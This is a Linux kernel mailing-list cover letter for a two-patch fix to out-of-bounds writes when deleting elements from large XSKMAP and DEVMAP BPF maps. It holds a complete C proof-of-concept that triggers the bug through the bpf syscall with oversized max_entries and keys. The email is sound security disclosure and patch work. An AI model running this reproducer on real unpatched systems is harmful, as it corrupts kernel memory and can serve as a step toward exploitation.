Return-Path: <bpf+bounces-45459-lists+bpf=lfdr.de@vger.kernel.org>
X-Original-To: lists+bpf@lfdr.de
Delivered-To: lists+bpf@lfdr.de
Received: from sy.mirrors.kernel.org (sy.mirrors.kernel.org [147.75.48.161])
	by mail.lfdr.de (Postfix) with ESMTPS id C66879D5E97
	for <lists+bpf@lfdr.de>; Fri, 22 Nov 2024 13:10:49 +0100 (CET)
Received: from smtp.subspace.kernel.org (wormhole.subspace.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by sy.mirrors.kernel.org (Postfix) with ESMTPS id 1E3C6B23299
	for <lists+bpf@lfdr.de>; Fri, 22 Nov 2024 12:10:47 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 68E261DE2CB;
	Fri, 22 Nov 2024 12:10:39 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=intel.com header.i=@intel.com header.b="KzRfDZRw"
X-Original-To: bpf@vger.kernel.org
Received: from mgamail.intel.com (mgamail.intel.com [192.198.163.16])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 4169E4500E;
	Fri, 22 Nov 2024 12:10:37 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=192.198.163.16
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1732277439; cv=none; b=CImXHC+mMG5r8Et+laBYJDUJyeT3g0GVgMtt5ohDfU2hxttkYsAL/K804NgQwfIgTf1RHUCUc/zQkDhRLw/JNSHTOkmpJ/GsGmPPDx+izBN8xjNMRXlFSp/47LKyz6uxHBViPt3W2BmT2pGj1i78Q4Km7P2yAyi+aeYjnBfk2r4=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1732277439; c=relaxed/simple;
	bh=L4zavfyLA4o68eATlkOurL6KhT/2AlkjQVk9FqfOUvA=;
	h=From:To:Cc:Subject:Date:Message-Id:MIME-Version:Content-Type; b=SVtsHcy7J7TJQM2tuvmN2BjC7ScEMYYefdit5ZbEkHzhRwOmiQ1+TI11hmmzAFNWXBBcM/6XAW8WdiHKLtg/UT8KJIf+rfA2cbA6eK2k7HmBA+q6KYAHWl+kTj2M2ItGx91LUn99fzd+/uUvJ/A0U0xbLe2ELrtWib1+NgtJVxs=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=intel.com; spf=pass smtp.mailfrom=intel.com; dkim=pass (2048-bit key) header.d=intel.com header.i=@intel.com header.b=KzRfDZRw; arc=none smtp.client-ip=192.198.163.16
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=intel.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=intel.com
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
  d=intel.com; i=@intel.com; q=dns/txt; s=Intel;
  t=1732277437; x=1763813437;
  h=from:to:cc:subject:date:message-id:mime-version:
   content-transfer-encoding;
  bh=L4zavfyLA4o68eATlkOurL6KhT/2AlkjQVk9FqfOUvA=;
  b=KzRfDZRw3qvD9CfG+zIsDBf6BWvXILu7lZphf6QDe+kuql8sYWM/E0Cs
   gpJiRxQPzrwUAJRrSJDM9Ki656LInAljqKw8PJvaKfmwlFZe6ngnMsmgl
   DukcOcWbx9CfOpNGzZpRl2EPCGvmxCW/ERBInr9x4ZicpFJczQJP855tH
   aNDItOElEovOM3saIcLGE9gzLlHZU6Bvw5awTDpPEXLWY2jGKNj1pwPHG
   VWWxzVVBIgPI9608ecJHPeYfkc7ejZMmxHxt48pOgV8wp6kVbZthODi+f
   UvD+YsRQ1FqboWori8JiTL2FlWfwpJKO/Di33QQhvpwEkfwRyb/VINH0Z
   A==;
X-CSE-ConnectionGUID: CVorj6bITmS9TbUA+Az9Ew==
X-CSE-MsgGUID: X/nUF3M7T7SW0F7Y+JjNNQ==
X-IronPort-AV: E=McAfee;i="6700,10204,11263"; a="20019724"
X-IronPort-AV: E=Sophos;i="6.12,175,1728975600"; 
   d="scan'208";a="20019724"
Received: from fmviesa004.fm.intel.com ([10.60.135.144])
  by fmvoesa110.fm.intel.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 22 Nov 2024 04:10:37 -0800
X-CSE-ConnectionGUID: jPI+KXzJTQWsrMcybvrI5A==
X-CSE-MsgGUID: +Q2skeJrS06n4hPwjMtrPw==
X-ExtLoop1: 1
X-IronPort-AV: E=Sophos;i="6.12,175,1728975600"; 
   d="scan'208";a="95354711"
Received: from boxer.igk.intel.com ([10.102.20.173])
  by fmviesa004.fm.intel.com with ESMTP; 22 Nov 2024 04:10:34 -0800
From: Maciej Fijalkowski <maciej.fijalkowski@intel.com>
To: bpf@vger.kernel.org,
	ast@kernel.org,
	daniel@iogearbox.net,
	andrii@kernel.org
Cc: netdev@vger.kernel.org,
	magnus.karlsson@intel.com,
	bjorn@kernel.org,
	maciej.fijalkowski@intel.com,
	jordyzomer@google.com,
	security@kernel.org
Subject: [PATCH v2 bpf 0/2] bpf: fix OOB accesses in map_delete_elem callbacks
Date: Fri, 22 Nov 2024 13:10:28 +0100
Message-Id: <20241122121030.716788-1-maciej.fijalkowski@intel.com>
X-Mailer: git-send-email 2.38.1
Precedence: bulk
X-Mailing-List: bpf@vger.kernel.org
List-Id: <bpf.vger.kernel.org>
List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit

v1->v2:
- CC stable and collect tags from Toke & John

Hi,

Jordy reported that for big enough XSKMAPs and DEVMAPs, when deleting
elements, OOB writes occur.

Reproducer below:

// compile with gcc -o map_poc map_poc.c -lbpf
#include <errno.h>
#include <linux/bpf.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <unistd.h>


int main() {
  // Create a large enough BPF XSK map
  int map_fd;
  union bpf_attr create_attr = {
      .map_type = BPF_MAP_TYPE_XSKMAP,
      .key_size = sizeof(int),
      .value_size = sizeof(int),
      .max_entries = 0x80000000 + 2,
  };

  map_fd = syscall(SYS_bpf, BPF_MAP_CREATE, &create_attr, sizeof(create_attr));
  if (map_fd < 0) {
    fprintf(stderr, "Failed to create BPF map: %s\n", strerror(errno));
    return 1;
  }


  // Delete an element from the map using syscall
  unsigned int key = 0x80000000 + 1;
  if (syscall(SYS_bpf, BPF_MAP_DELETE_ELEM,
              &(union bpf_attr){
                  .map_fd = map_fd,
                  .key = &key,
              },
              sizeof(union bpf_attr)) < 0) {
    fprintf(stderr, "Failed to delete element from BPF map: %s\n",
            strerror(errno));
    return 1;
  }

  close(map_fd);
  return 0;
}

This tiny series changes data types from int to u32 of keys being used
for map accesses.

Thanks,
Maciej


Maciej Fijalkowski (2):
  xsk: fix OOB map writes when deleting elements
  bpf: fix OOB devmap writes when deleting elements

 kernel/bpf/devmap.c | 6 +++---
 net/xdp/xskmap.c    | 2 +-
 2 files changed, 4 insertions(+), 4 deletions(-)

-- 
2.34.1


